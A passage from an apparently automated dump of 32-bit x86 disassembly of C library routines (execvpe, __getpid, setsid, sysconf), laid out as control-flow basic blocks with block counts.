v
0xb0b64b8:	mov	dword ptr [esp + 4], eax
0xb0b64bc:	mov	dword ptr [esp], 0
0xb0b64c3:	mov	dword ptr [esp + 0x1c], ecx
0xb0b64c7:	mov	dword ptr [esp + 0x18], edx
0xb0b64cb:	call	0xb0173e0
None
|
|
|
v
0xb0b647d:	mov	eax, dword ptr [esp + 0x14]
0xb0b6481:	add	esp, 0x102c
0xb0b6487:	pop	ebx
0xb0b6488:	pop	esi
0xb0b6489:	pop	edi
0xb0b648a:	pop	ebp
0xb0b648b:	ret	
None
|
|
|
v
0xb0b64a5:	mov	dword ptr [esp], ebp
0xb0b64a8:	call	0xb017470
None
|
|
|
v
0xb0b64f9:	mov	ecx, dword ptr [esp + 0x18]
0xb0b64fd:	mov	eax, ecx
0xb0b64ff:	jmp	0xb0b6408
None
|
|
|
v
0xb0b6471:	mov	dword ptr [esp], ebp
0xb0b6474:	mov	dword ptr [esp + 0x14], eax
0xb0b6478:	call	0xb017470
None
|
|
|
v
0xb0b6420:	cmp	eax, esi
0xb0b6422:	jne	0xb0b6408
None
|
|
|
v
0xb0b64d0:	mov	edx, dword ptr [esp + 0x18]
0xb0b64d4:	mov	ecx, dword ptr [esp + 0x1c]
0xb0b64d8:	test	eax, eax
0xb0b64da:	mov	ebp, eax
0xb0b64dc:	je	0xb0b64ad
None
|
|
|
v
0xb0b646b:	cmp	ebp, dword ptr [esp + 0x14]
0xb0b646f:	je	0xb0b6481
None
|
|
|
v
0xb0b63ef:	lea	eax, dword ptr [esp + 0x20]
0xb0b63f3:	mov	esi, 1
0xb0b63f8:	mov	dword ptr [esp + 0x14], eax
0xb0b63fc:	mov	ebp, eax
0xb0b63fe:	mov	eax, 0x400
0xb0b6403:	nop	
0xb0b6404:	lea	esi, dword ptr [esi]
0xb0b6408:	add	edi, 4
0xb0b640b:	mov	ecx, dword ptr [edi - 4]
0xb0b640e:	lea	edx, dword ptr [esi*4]
0xb0b6415:	mov	dword ptr [ebp + esi*4], ecx
0xb0b6419:	add	esi, 1
0xb0b641c:	test	ecx, ecx
0xb0b641e:	je	0xb0b6458
None
|
|
|
v
0xb0b64de:	mov	eax, dword ptr [esp + 0x14]
0xb0b64e2:	add	edx, 4
0xb0b64e5:	mov	dword ptr [esp + 8], edx
0xb0b64e9:	mov	dword ptr [esp], ebp
0xb0b64ec:	mov	dword ptr [esp + 0x18], ecx
0xb0b64f0:	mov	dword ptr [esp + 4], eax
0xb0b64f4:	call	0xb07d0b0
None
|
|
|
v
0xb0b64a3:	jmp	0xb0b6481
None
|
|
|
v
0xb0b63dd:	add	ebx, 0xf4c23
0xb0b63e3:	test	eax, eax
0xb0b63e5:	mov	dword ptr [esp + 0x20], eax
0xb0b63e9:	je	0xb0b648c
None
|
|
|
v
0xb0b6444:	test	eax, eax
0xb0b6446:	je	0xb0b64a5
None
|
|
|
v
0xb0b6448:	mov	ecx, dword ptr [esp + 0x18]
0xb0b644c:	mov	ebp, eax
0xb0b644e:	mov	eax, ecx
0xb0b6450:	jmp	0xb0b6408
None
|
|
|
v
0xb0b6424:	lea	ecx, dword ptr [eax + eax]
0xb0b6427:	shl	eax, 3
0xb0b642a:	cmp	ebp, dword ptr [esp + 0x14]
0xb0b642e:	je	0xb0b64b8
None
|
|
|
v
0xb0b64ad:	mov	eax, 0xffffffff
0xb0b64b2:	jmp	0xb0b6481
None
|
|
|
v
0xb0b648c:	lea	eax, dword ptr [esp + 0x20]
0xb0b6490:	mov	dword ptr [esp + 4], eax
0xb0b6494:	mov	eax, dword ptr [esp + 0x1040]
0xb0b649b:	mov	dword ptr [esp], eax
0xb0b649e:	call	0xb0b6380
None
|
|
|
v
0xb0b63c0:	push	ebp
0xb0b63c1:	push	edi
0xb0b63c2:	push	esi
0xb0b63c3:	push	ebx
0xb0b63c4:	sub	esp, 0x102c
0xb0b63ca:	mov	eax, dword ptr [esp + 0x1044]
0xb0b63d1:	lea	edi, dword ptr [esp + 0x1048]
0xb0b63d8:	call	0xb1267db
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:execvpe
TOTAL BLOCKS :84
0xb0b6778:	cmp	eax, 0xd
0xb0b677b:	jne	0xb0b6573
None
|
|
|
v
0xb0b664e:	test	eax, eax
0xb0b6650:	mov	esi, eax
0xb0b6652:	je	0xb0b6887
None
|
|
|
v
0xb0b6660:	mov	dword ptr [ebp - 0x20], 1
0xb0b6667:	mov	dword ptr [ebp - 0x1c], eax
0xb0b666a:	mov	eax, dword ptr [ebp + 8]
0xb0b666d:	mov	dword ptr [esp], eax
0xb0b6670:	call	0xb07ae80
None
|
|
|
v
0xb0b6753:	mov	eax, dword ptr [ebp - 0x20]
0xb0b6756:	mov	ecx, dword ptr [ebx - 0xdc]
0xb0b675c:	mov	edx, dword ptr [eax + ecx]
0xb0b675f:	mov	ecx, dword ptr [ebp - 0x1c]
0xb0b6762:	cmp	edx, 8
0xb0b6765:	mov	eax, edx
0xb0b6767:	je	0xb0b67d8
None
|
|
|
v
0xb0b6769:	cmp	eax, 0x14
0xb0b676c:	jg	0xb0b67c8
None
|
|
|
v
0xb0b695a:	mov	dword ptr [ebp - 0x3c], eax
0xb0b695d:	mov	edx, dword ptr [ebp - 0x24]
0xb0b6960:	mov	ecx, dword ptr [ebp - 0x28]
0xb0b6963:	jmp	0xb0b66ad
None
|
|
|
v
0xb0b6992:	jmp	0xb0b6573
None
|
|
|
v
0xb0b6863:	mov	ecx, eax
0xb0b6865:	lea	esi, dword ptr [esi]
0xb0b6868:	mov	eax, dword ptr [edi + edx*4 - 4]
0xb0b686c:	mov	dword ptr [ecx + edx*4], eax
0xb0b686f:	sub	edx, 1
0xb0b6872:	cmp	edx, 1
0xb0b6875:	jne	0xb0b6868
None
|
|
|
v
0xb0b66b5:	mov	ecx, dword ptr [ebp - 0x1c]
0xb0b66b8:	mov	eax, dword ptr [ebp - 0x20]
0xb0b66bb:	mov	dword ptr [esp + 8], edx
0xb0b66bf:	lea	eax, dword ptr [eax + ecx + 1]
0xb0b66c3:	mov	ecx, dword ptr [ebp + 8]
0xb0b66c6:	mov	dword ptr [esp], eax
0xb0b66c9:	mov	dword ptr [esp + 4], ecx
0xb0b66cd:	call	0xb07d0b0
None
|
|
|
v
0xb0b6705:	mov	dword ptr [esp], edx
0xb0b6708:	mov	dword ptr [esp + 4], 0x3a
0xb0b6710:	mov	dword ptr [ebp - 0x1c], edx
0xb0b6713:	call	0xb07ee30
None
|
|
|
v
0xb0b693e:	mov	eax, dword ptr [ebp - 0x30]
0xb0b6941:	mov	dword ptr [ebp - 0x28], ecx
0xb0b6944:	mov	dword ptr [ebp - 0x24], edx
0xb0b6947:	mov	dword ptr [esp], eax
0xb0b694a:	call	0xb0173f0
None
|
|
|
v
0xb0b68d8:	mov	edx, dword ptr [ebp - 0x24]
0xb0b68db:	jmp	0xb0b66b5
None
|
|
|
v
0xb0b673b:	mov	ecx, eax
0xb0b673d:	mov	eax, dword ptr [ebp + 0x10]
0xb0b6740:	mov	dword ptr [esp], ecx
0xb0b6743:	mov	dword ptr [esp + 4], edi
0xb0b6747:	mov	dword ptr [ebp - 0x1c], ecx
0xb0b674a:	mov	dword ptr [esp + 8], eax
0xb0b674e:	call	0xb0b5f40
None
|
|
|
v
0xb0b67fa:	mov	eax, dword ptr [ebp - 0x20]
0xb0b67fd:	mov	ecx, dword ptr [ebx - 0xdc]
0xb0b6803:	mov	eax, dword ptr [eax + ecx]
0xb0b6806:	jmp	0xb0b6769
None
|
|
|
v
0xb0b65fb:	nop	
0xb0b65fc:	lea	esi, dword ptr [esi]
None
|
|
|
v
0xb0b6837:	mov	eax, dword ptr [ebp - 0x1c]
0xb0b683a:	add	eax, 0x1e
0xb0b683d:	and	eax, 0xfffffff0
0xb0b6840:	sub	esp, eax
0xb0b6842:	lea	eax, dword ptr [esp + 0x1b]
0xb0b6846:	and	eax, 0xfffffff0
0xb0b6849:	mov	dword ptr [ebp - 0x28], eax
0xb0b684c:	mov	eax, dword ptr [ebp - 0x28]
0xb0b684f:	mov	edx, dword ptr [ebp - 0x38]
0xb0b6852:	mov	dword ptr [eax + 4], ecx
0xb0b6855:	mov	dword ptr [eax], edx
0xb0b6857:	mov	edx, dword ptr [ebp - 0x44]
0xb0b685a:	cmp	edx, 1
0xb0b685d:	je	0xb0b68e0
None
|
|
|
v
0xb0b687f:	mov	eax, dword ptr [ebp - 0x1c]
0xb0b6882:	jmp	0xb0b6611
None
|
|
|
v
0xb0b65b0:	mov	eax, esi
0xb0b65b2:	lea	esi, dword ptr [eax + 1]
0xb0b65b5:	mov	edx, dword ptr [edi + esi*4 - 4]
0xb0b65b9:	test	edx, edx
0xb0b65bb:	jne	0xb0b65b0
None
|
|
|
v
0xb0b67d6:	jmp	0xb0b6785
None
|
|
|
v
0xb0b6868:	mov	eax, dword ptr [edi + edx*4 - 4]
0xb0b686c:	mov	dword ptr [ecx + edx*4], eax
0xb0b686f:	sub	edx, 1
0xb0b6872:	cmp	edx, 1
0xb0b6875:	jne	0xb0b6868
None
|
|
|
v
0xb0b65a8:	xor	eax, eax
0xb0b65aa:	jmp	0xb0b65b2
None
|
|
|
v
0xb0b6510:	push	ebp
0xb0b6511:	mov	ebp, esp
0xb0b6513:	push	edi
0xb0b6514:	push	esi
0xb0b6515:	push	ebx
0xb0b6516:	sub	esp, 0x4c
0xb0b6519:	mov	eax, dword ptr [ebp + 8]
0xb0b651c:	call	0xb1267db
None
|
|
|
v
0xb0b68e0:	mov	eax, dword ptr [ebp - 0x38]
0xb0b68e3:	jmp	0xb0b67e4
None
|
|
|
v
0xb0b6986:	test	eax, eax
0xb0b6988:	mov	ecx, eax
0xb0b698a:	mov	edx, eax
0xb0b698c:	jne	0xb0b65e1
None
|
|
|
v
0xb0b6791:	cmp	byte ptr [ebp - 0x31], 0
0xb0b6795:	je	0xb0b67a7
None
|
|
|
v
0xb0b676e:	cmp	eax, 0x13
0xb0b6771:	jge	0xb0b6785
None
|
|
|
v
0xb0b6600:	mov	eax, dword ptr [edi + esi*4 - 4]
0xb0b6604:	mov	dword ptr [edx + esi*4], eax
0xb0b6607:	sub	esi, 1
0xb0b660a:	cmp	esi, 1
0xb0b660d:	jne	0xb0b6600
None
|
|
|
v
0xb0b65bd:	lea	edx, dword ptr [eax*4 + 8]
0xb0b65c4:	cmp	edx, 0x1000
0xb0b65ca:	ja	0xb0b6968
None
|
|
|
v
0xb0b65b2:	lea	esi, dword ptr [eax + 1]
0xb0b65b5:	mov	edx, dword ptr [edi + esi*4 - 4]
0xb0b65b9:	test	edx, edx
0xb0b65bb:	jne	0xb0b65b0
None
|
|
|
v
0xb0b6968:	mov	dword ptr [esp], edx
0xb0b696b:	mov	dword ptr [ebp - 0x1c], edx
0xb0b696e:	call	0xb0f8ac0
None
|
|
|
v
0xb0b67bd:	jmp	0xb0b6573
None
|
|
|
v
0xb0b67a7:	mov	eax, dword ptr [ebp - 0x40]
0xb0b67aa:	mov	dword ptr [esp], eax
0xb0b67ad:	call	0xb017470
None
|
|
|
v
0xb0b66ad:	test	esi, esi
0xb0b66af:	je	0xb0b68b1
None
|
|
|
v
0xb0b6573:	lea	esp, dword ptr [ebp - 0xc]
0xb0b6576:	mov	eax, 0xffffffff
0xb0b657b:	pop	ebx
0xb0b657c:	pop	esi
0xb0b657d:	pop	edi
0xb0b657e:	pop	ebp
0xb0b657f:	ret	
None
|
|
|
v
0xb0b6887:	mov	dword ptr [esp + 8], 0
0xb0b688f:	mov	dword ptr [esp + 4], 0
0xb0b6897:	mov	dword ptr [esp], 0
0xb0b689e:	call	0xb0c1140
None
|
|
|
v
0xb0b652f:	mov	eax, dword ptr [ebp + 8]
0xb0b6532:	mov	dword ptr [esp + 4], 0x2f
0xb0b653a:	mov	dword ptr [esp], eax
0xb0b653d:	call	0xb07a520
None
|
|
|
v
0xb0b6917:	mov	dword ptr [ebp - 0x28], eax
0xb0b691a:	mov	ecx, dword ptr [ebp - 0x48]
0xb0b691d:	jmp	0xb0b684c
None
|
|
|
v
0xb0b6810:	mov	eax, edx
0xb0b6812:	lea	edx, dword ptr [eax + 1]
0xb0b6815:	cmp	dword ptr [edi + edx*4 - 4], 0
0xb0b681a:	jne	0xb0b6810
None
|
|
|
v
0xb0b6691:	mov	eax, dword ptr [ebp - 0x30]
0xb0b6694:	mov	dword ptr [ebp - 0x3c], 0
0xb0b669b:	add	eax, 0x1e
0xb0b669e:	and	eax, 0xfffffff0
0xb0b66a1:	sub	esp, eax
0xb0b66a3:	lea	eax, dword ptr [esp + 0x1b]
0xb0b66a7:	and	eax, 0xfffffff0
0xb0b66aa:	mov	dword ptr [ebp - 0x20], eax
0xb0b66ad:	test	esi, esi
0xb0b66af:	je	0xb0b68b1
None
|
|
|
v
0xb0b67e4:	mov	ecx, dword ptr [ebp + 0x10]
0xb0b67e7:	mov	dword ptr [esp], eax
0xb0b67ea:	mov	dword ptr [esp + 8], ecx
0xb0b67ee:	mov	ecx, dword ptr [ebp - 0x28]
0xb0b67f1:	mov	dword ptr [esp + 4], ecx
0xb0b67f5:	call	0xb0b5f40
None
|
|
|
v
0xb0b6580:	mov	eax, dword ptr [ebx - 0xdc]
0xb0b6586:	mov	edx, dword ptr gs:[0]
0xb0b658d:	mov	dword ptr [edx + eax], 2
0xb0b6594:	lea	esp, dword ptr [ebp - 0xc]
0xb0b6597:	mov	eax, 0xffffffff
0xb0b659c:	pop	ebx
0xb0b659d:	pop	esi
0xb0b659e:	pop	edi
0xb0b659f:	pop	ebp
0xb0b65a0:	ret	
None
|
|
|
v
0xb0b6658:	mov	dword ptr [esp], eax
0xb0b665b:	call	0xb07ae80
None
|
|
|
v
0xb0b680b:	xor	eax, eax
0xb0b680d:	jmp	0xb0b6812
None
|
|
|
v
0xb0b681c:	lea	eax, dword ptr [eax*4 + 8]
0xb0b6823:	mov	dword ptr [ebp - 0x1c], eax
0xb0b6826:	add	eax, dword ptr [ebp - 0x30]
0xb0b6829:	mov	dword ptr [ebp - 0x44], edx
0xb0b682c:	cmp	eax, 0x1000
0xb0b6831:	ja	0xb0b68e8
None
|
|
|
v
0xb0b68b1:	mov	eax, dword ptr [ebp - 0x20]
0xb0b68b4:	mov	dword ptr [ebp - 0x24], edx
0xb0b68b7:	lea	esi, dword ptr [eax + ecx + 1]
0xb0b68bb:	mov	eax, dword ptr [ebp - 0x1c]
0xb0b68be:	mov	byte ptr [esi], 0x3a
0xb0b68c1:	mov	dword ptr [esp], 0
0xb0b68c8:	mov	dword ptr [esp + 8], eax
0xb0b68cc:	lea	eax, dword ptr [esi + 1]
0xb0b68cf:	mov	dword ptr [esp + 4], eax
0xb0b68d3:	call	0xb0c1140
None
|
|
|
v
0xb0b6640:	lea	eax, dword ptr [ebx - 0x4acbc]
0xb0b6646:	mov	dword ptr [esp], eax
0xb0b6649:	call	0xb032860
None
|
|
|
v
0xb0b6560:	mov	eax, dword ptr [ebx - 0xdc]
0xb0b6566:	mov	edx, dword ptr gs:[0]
0xb0b656d:	cmp	dword ptr [edx + eax], 8
0xb0b6571:	je	0xb0b65a8
None
|
|
|
v
0xb0b6781:	mov	byte ptr [ebp - 0x31], 1
0xb0b6785:	cmp	byte ptr [esi], 0
0xb0b6788:	lea	edx, dword ptr [esi + 1]
0xb0b678b:	jne	0xb0b6705
None
|
|
|
v
0xb0b6521:	add	ebx, 0xf4adf
0xb0b6527:	mov	edi, dword ptr [ebp + 0xc]
0xb0b652a:	cmp	byte ptr [eax], 0
0xb0b652d:	je	0xb0b6580
None
|
|
|
v
0xb0b6632:	lea	esp, dword ptr [ebp - 0xc]
0xb0b6635:	mov	eax, 0xffffffff
0xb0b663a:	pop	ebx
0xb0b663b:	pop	esi
0xb0b663c:	pop	edi
0xb0b663d:	pop	ebp
0xb0b663e:	ret	
None
|
|
|
v
0xb0b690c:	test	eax, eax
0xb0b690e:	mov	dword ptr [ebp - 0x40], eax
0xb0b6911:	je	0xb0b67a7
None
|
|
|
v
0xb0b6773:	cmp	eax, 2
0xb0b6776:	je	0xb0b6785
None
|
|
|
v
0xb0b673d:	mov	eax, dword ptr [ebp + 0x10]
0xb0b6740:	mov	dword ptr [esp], ecx
0xb0b6743:	mov	dword ptr [esp + 4], edi
0xb0b6747:	mov	dword ptr [ebp - 0x1c], ecx
0xb0b674a:	mov	dword ptr [esp + 8], eax
0xb0b674e:	call	0xb0b5f40
None
|
|
|
v
0xb0b6724:	mov	ecx, dword ptr [ebp - 0x2c]
0xb0b6727:	sub	eax, edx
0xb0b6729:	mov	dword ptr [esp + 8], eax
0xb0b672d:	mov	dword ptr [esp + 4], edx
0xb0b6731:	sub	ecx, eax
0xb0b6733:	mov	dword ptr [esp], ecx
0xb0b6736:	call	0xb07d0b0
None
|
|
|
v
0xb0b66d2:	mov	edx, esi
0xb0b66d4:	mov	byte ptr [ebp - 0x31], 0
0xb0b66d8:	mov	dword ptr [ebp - 0x40], 0
0xb0b66df:	mov	dword ptr [ebp - 0x28], 0
0xb0b66e6:	lea	ecx, dword ptr [eax - 1]
0xb0b66e9:	mov	dword ptr [ebp - 0x24], eax
0xb0b66ec:	mov	byte ptr [eax - 1], 0x2f
0xb0b66f0:	mov	eax, dword ptr gs:[0]
0xb0b66f6:	mov	dword ptr [ebp - 0x2c], ecx
0xb0b66f9:	mov	dword ptr [ebp - 0x20], eax
0xb0b66fc:	lea	eax, dword ptr [ebx - 0x4a7b4]
0xb0b6702:	mov	dword ptr [ebp - 0x38], eax
0xb0b6705:	mov	dword ptr [esp], edx
0xb0b6708:	mov	dword ptr [esp + 4], 0x3a
0xb0b6710:	mov	dword ptr [ebp - 0x1c], edx
0xb0b6713:	call	0xb07ee30
None
|
|
|
v
0xb0b6611:	mov	dword ptr [ebp - 0x1c], ecx
0xb0b6614:	mov	ecx, dword ptr [ebp + 0x10]
0xb0b6617:	mov	dword ptr [esp + 4], edx
0xb0b661b:	mov	dword ptr [esp], eax
0xb0b661e:	mov	dword ptr [esp + 8], ecx
0xb0b6622:	call	0xb0b5f40
None
|
|
|
v
0xb0b6542:	test	eax, eax
0xb0b6544:	je	0xb0b6640
None
|
|
|
v
0xb0b6930:	mov	edx, dword ptr [ebp - 0x20]
0xb0b6933:	mov	ecx, dword ptr [ebp - 0x24]
0xb0b6936:	test	eax, eax
0xb0b6938:	jne	0xb0b6691
None
|
|
|
v
0xb0b660f:	mov	eax, dword ptr [edx]
0xb0b6611:	mov	dword ptr [ebp - 0x1c], ecx
0xb0b6614:	mov	ecx, dword ptr [ebp + 0x10]
0xb0b6617:	mov	dword ptr [esp + 4], edx
0xb0b661b:	mov	dword ptr [esp], eax
0xb0b661e:	mov	dword ptr [esp + 8], ecx
0xb0b6622:	call	0xb0b5f40
None
|
|
|
v
0xb0b67c8:	cmp	eax, 0x6e
0xb0b67cb:	je	0xb0b6785
None
|
|
|
v
0xb0b684c:	mov	eax, dword ptr [ebp - 0x28]
0xb0b684f:	mov	edx, dword ptr [ebp - 0x38]
0xb0b6852:	mov	dword ptr [eax + 4], ecx
0xb0b6855:	mov	dword ptr [eax], edx
0xb0b6857:	mov	edx, dword ptr [ebp - 0x44]
0xb0b685a:	cmp	edx, 1
0xb0b685d:	je	0xb0b68e0
None
|
|
|
v
0xb0b6812:	lea	edx, dword ptr [eax + 1]
0xb0b6815:	cmp	dword ptr [edi + edx*4 - 4], 0
0xb0b681a:	jne	0xb0b6810
None
|
|
|
v
0xb0b67cd:	cmp	eax, 0x74
0xb0b67d0:	jne	0xb0b6573
None
|
|
|
v
0xb0b65d0:	lea	eax, dword ptr [edx + 0x1e]
0xb0b65d3:	xor	ecx, ecx
0xb0b65d5:	and	eax, 0xfffffff0
0xb0b65d8:	sub	esp, eax
0xb0b65da:	lea	edx, dword ptr [esp + 0x1b]
0xb0b65de:	and	edx, 0xfffffff0
0xb0b65e1:	lea	eax, dword ptr [ebx - 0x4a7b4]
0xb0b65e7:	cmp	esi, 1
0xb0b65ea:	mov	dword ptr [ebp - 0x1c], eax
0xb0b65ed:	mov	dword ptr [edx], eax
0xb0b65ef:	mov	eax, dword ptr [ebp + 8]
0xb0b65f2:	mov	dword ptr [edx + 4], eax
0xb0b65f5:	je	0xb0b687f
None
|
|
|
v
0xb0b654a:	mov	eax, dword ptr [ebp + 0x10]
0xb0b654d:	mov	dword ptr [esp + 4], edi
0xb0b6551:	mov	dword ptr [esp + 8], eax
0xb0b6555:	mov	eax, dword ptr [ebp + 8]
0xb0b6558:	mov	dword ptr [esp], eax
0xb0b655b:	call	0xb0b5f40
None
|
|
|
v
0xb0b666a:	mov	eax, dword ptr [ebp + 8]
0xb0b666d:	mov	dword ptr [esp], eax
0xb0b6670:	call	0xb07ae80
None
|
|
|
v
0xb0b6627:	mov	ecx, dword ptr [ebp - 0x1c]
0xb0b662a:	mov	dword ptr [esp], ecx
0xb0b662d:	call	0xb017470
None
|
|
|
v
0xb0b68e8:	mov	dword ptr [esp], eax
0xb0b68eb:	mov	dword ptr [ebp - 0x28], ecx
0xb0b68ee:	call	0xb0f8ac0
None
|
|
|
v
0xb0b65e1:	lea	eax, dword ptr [ebx - 0x4a7b4]
0xb0b65e7:	cmp	esi, 1
0xb0b65ea:	mov	dword ptr [ebp - 0x1c], eax
0xb0b65ed:	mov	dword ptr [edx], eax
0xb0b65ef:	mov	eax, dword ptr [ebp + 8]
0xb0b65f2:	mov	dword ptr [edx + 4], eax
0xb0b65f5:	je	0xb0b687f
None
|
|
|
v
0xb0b6675:	lea	edx, dword ptr [eax + 1]
0xb0b6678:	mov	eax, dword ptr [ebp - 0x1c]
0xb0b667b:	lea	ecx, dword ptr [edx + eax]
0xb0b667e:	mov	eax, dword ptr [ebp - 0x20]
0xb0b6681:	add	eax, ecx
0xb0b6683:	cmp	eax, 0x1000
0xb0b6688:	mov	dword ptr [ebp - 0x30], eax
0xb0b668b:	ja	0xb0b6922
None
|
|
|
v
0xb0b68fe:	mov	eax, dword ptr [ebp - 0x1c]
0xb0b6901:	mov	dword ptr [ebp - 0x48], ecx
0xb0b6904:	mov	dword ptr [esp], eax
0xb0b6907:	call	0xb0173f0
None
|
|
|
v
0xb0b6877:	mov	eax, dword ptr [ebp - 0x28]
0xb0b687a:	jmp	0xb0b67e2
None
|
|
|
v
0xb0b697e:	mov	dword ptr [esp], edx
0xb0b6981:	call	0xb0173f0
None
|
|
|
v
0xb0b67d8:	mov	eax, dword ptr [ebp - 0x28]
0xb0b67db:	test	eax, eax
0xb0b67dd:	lea	esi, dword ptr [esi]
0xb0b67e0:	je	0xb0b680b
None
|
|
|
v
0xb0b694f:	test	eax, eax
0xb0b6951:	mov	dword ptr [ebp - 0x20], eax
0xb0b6954:	je	0xb0b6573
None
|
|
|
v
0xb0b67b2:	mov	eax, dword ptr [ebp - 0x3c]
0xb0b67b5:	mov	dword ptr [esp], eax
0xb0b67b8:	call	0xb017470
None
|
|
|
v
0xb0b6785:	cmp	byte ptr [esi], 0
0xb0b6788:	lea	edx, dword ptr [esi + 1]
0xb0b678b:	jne	0xb0b6705
None
|
|
|
v
0xb0b68a3:	mov	dword ptr [ebp - 0x1c], eax
0xb0b68a6:	add	eax, 2
0xb0b68a9:	mov	dword ptr [ebp - 0x20], eax
0xb0b68ac:	jmp	0xb0b666a
None
|
|
|
v
0xb0b6718:	mov	edx, dword ptr [ebp - 0x1c]
0xb0b671b:	mov	ecx, dword ptr [ebp - 0x24]
0xb0b671e:	cmp	edx, eax
0xb0b6720:	mov	esi, eax
0xb0b6722:	je	0xb0b673d
None
|
|
|
v
0xb0b6797:	mov	eax, dword ptr [ebp - 0x20]
0xb0b679a:	mov	ecx, dword ptr [ebx - 0xdc]
0xb0b67a0:	mov	dword ptr [eax + ecx], 0xd
0xb0b67a7:	mov	eax, dword ptr [ebp - 0x40]
0xb0b67aa:	mov	dword ptr [esp], eax
0xb0b67ad:	call	0xb017470
None
|
|
|
v
0xb0b68f3:	mov	ecx, dword ptr [ebp - 0x28]
0xb0b68f6:	test	eax, eax
0xb0b68f8:	jne	0xb0b6837
None
|
|
|
v
0xb0b6922:	mov	dword ptr [esp], eax
0xb0b6925:	mov	dword ptr [ebp - 0x24], ecx
0xb0b6928:	mov	dword ptr [ebp - 0x20], edx
0xb0b692b:	call	0xb0f8ac0
None
|
|
|
v
0xb0b6973:	mov	edx, dword ptr [ebp - 0x1c]
0xb0b6976:	test	eax, eax
0xb0b6978:	jne	0xb0b65d0
None
|
|
|
v
0xb0b67e2:	mov	eax, dword ptr [eax]
0xb0b67e4:	mov	ecx, dword ptr [ebp + 0x10]
0xb0b67e7:	mov	dword ptr [esp], eax
0xb0b67ea:	mov	dword ptr [esp + 8], ecx
0xb0b67ee:	mov	ecx, dword ptr [ebp - 0x28]
0xb0b67f1:	mov	dword ptr [esp + 4], ecx
0xb0b67f5:	call	0xb0b5f40
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:__getpid
TOTAL BLOCKS :7
0xb0b69d4:	mov	dword ptr gs:[0x68], ecx
0xb0b69db:	nop	
0xb0b69dc:	lea	esi, dword ptr [esi]
0xb0b69e0:	ret	
None
|
|
|
v
0xb0b69a0:	mov	edx, dword ptr gs:[0x6c]
0xb0b69a7:	cmp	edx, 0
0xb0b69aa:	mov	eax, edx
0xb0b69ac:	jle	0xb0b69b0
None
|
|
|
v
0xb0b69b0:	jne	0xb0b69c2
None
|
|
|
v
0xb0b69ce:	test	edx, edx
0xb0b69d0:	mov	ecx, eax
0xb0b69d2:	jne	0xb0b69ae
None
|
|
|
v
0xb0b69b2:	mov	eax, dword ptr gs:[0x68]
0xb0b69b8:	test	eax, eax
0xb0b69ba:	lea	esi, dword ptr [esi]
0xb0b69c0:	jne	0xb0b69ae
None
|
|
|
v
0xb0b69c2:	mov	eax, 0x14
0xb0b69c7:	call	dword ptr gs:[0x10]
None
|
|
|
v
0xb0b69ae:	ret	
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:setsid
TOTAL BLOCKS :5
0xb0b6d34:	call	0xb1267df
None
|
|
|
v
0xb0b6d2c:	cmp	eax, 0xfffff001
0xb0b6d31:	jae	0xb0b6d34
None
|
|
|
v
0xb0b6d33:	ret	
None
|
|
|
v
0xb0b6d39:	add	ecx, 0xf42c7
0xb0b6d3f:	mov	ecx, dword ptr [ecx - 0xdc]
0xb0b6d45:	neg	eax
0xb0b6d47:	add	ecx, dword ptr gs:[0]
0xb0b6d4e:	mov	dword ptr [ecx], eax
0xb0b6d50:	or	eax, 0xffffffff
0xb0b6d53:	ret	
None
|
|
|
v
0xb0b6d20:	mov	eax, 0x42
0xb0b6d25:	call	dword ptr gs:[0x10]
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sysconf
TOTAL BLOCKS :37
0xb0b7b18:	mov	dword ptr [esp], esi
0xb0b7b1b:	call	0xb095610
None
|
|
|
v
0xb0b79e0:	add	ebx, 0xf3620
0xb0b79e6:	lea	eax, dword ptr [esi - 0xb9]
0xb0b79ec:	cmp	eax, 0xe
0xb0b79ef:	jbe	0xb0b7b18
None
|
|
|
v
0xb0b7abc:	mov	eax, dword ptr [ebx + esi*4 - 0x4e104]
0xb0b7ac3:	add	eax, ebx
0xb0b7ac5:	jmp	eax
None
|
|
|
v
0xb0b7a04:	test	esi, esi
0xb0b7a06:	je	0xb0b7b28
None
|
|
|
v
0xb0b7afb:	xchg	ebx, edx
0xb0b7afd:	cmp	eax, 0xfffff001
0xb0b7b02:	sbb	eax, eax
0xb0b7b04:	add	esp, 0x4c
0xb0b7b07:	and	eax, 0x3106a
0xb0b7b0c:	pop	ebx
0xb0b7b0d:	sub	eax, 1
0xb0b7b10:	pop	esi
0xb0b7b11:	pop	edi
0xb0b7b12:	pop	ebp
0xb0b7b13:	ret	
None
|
|
|
v
0xb0b80d5:	mov	eax, dword ptr [ebx - 0xdc]
0xb0b80db:	mov	edx, dword ptr gs:[0]
0xb0b80e2:	mov	dword ptr [edx + eax], 0x16
0xb0b80e9:	mov	eax, 0xffffffff
0xb0b80ee:	jmp	0xb0b7b20
None
|
|
|
v
0xb0b7ae4:	lea	ecx, dword ptr [esp + 0x20]
0xb0b7ae8:	mov	edx, 1
0xb0b7aed:	xchg	ebx, edx
0xb0b7aef:	mov	eax, 0x10a
0xb0b7af4:	call	dword ptr gs:[0x10]
None
|
|
|
v
0xb0b7a36:	jmp	0xb0b7ab0
None
|
|
|
v
0xb0b7ad0:	cmp	esi, 0x8b
0xb0b7ad6:	jle	0xb0b7b60
None
|
|
|
v
0xb0b7a1b:	mov	dword ptr [esp + 4], 0
0xb0b7a23:	lea	edi, dword ptr [esp + 0x20]
0xb0b7a27:	mov	dword ptr [esp], eax
0xb0b7a2a:	call	0xb0daada
None
|
|
|
v
0xb0b7b3c:	mov	edx, eax
0xb0b7b3e:	mov	eax, 0x20000
0xb0b7b43:	test	edx, edx
0xb0b7b45:	jne	0xb0b7b20
None
|
|
|
v
0xb0b7b84:	test	eax, eax
0xb0b7b86:	jne	0xb0b7b90
None
|
|
|
v
0xb0b7a98:	mov	edx, dword ptr [esp + 0x1c]
0xb0b7a9c:	cmp	edx, edi
0xb0b7a9e:	je	0xb0b7ab0
None
|
|
|
v
0xb0b7ac8:	cmp	esi, 0x8a
0xb0b7ace:	jl	0xb0b7ab0
None
|
|
|
v
0xb0b7a4a:	mov	dword ptr [esp + 8], 0x1f
0xb0b7a52:	mov	dword ptr [esp + 4], edi
0xb0b7a56:	mov	dword ptr [esp], ebp
0xb0b7a59:	call	0xb0daf6a
None
|
|
|
v
0xb0b7b88:	mov	eax, dword ptr [esp + 0x20]
0xb0b7b8c:	jmp	0xb0b7b20
